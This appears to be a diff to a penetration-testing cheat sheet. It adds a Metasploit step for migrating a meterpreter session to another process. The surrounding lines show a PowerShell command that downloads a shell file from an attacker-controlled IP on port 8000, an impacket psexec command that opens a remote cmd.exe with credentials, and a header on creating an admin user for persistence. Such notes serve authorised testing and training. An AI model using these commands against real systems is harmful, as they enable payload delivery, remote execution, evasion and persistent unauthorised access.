@@ -50,6 +50,11 @@ powershell (New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shel
 python3 /usr/share/doc/python3-impacket/examples/psexec.py domain/user:password@0.0.0.0 cmd.exe
 ```
 
+- Migrate meterpreter's process
+```
+use post/windows/manage/migrate
+```
+
 # post exploitation consolidation
 ## create admin user
 ```
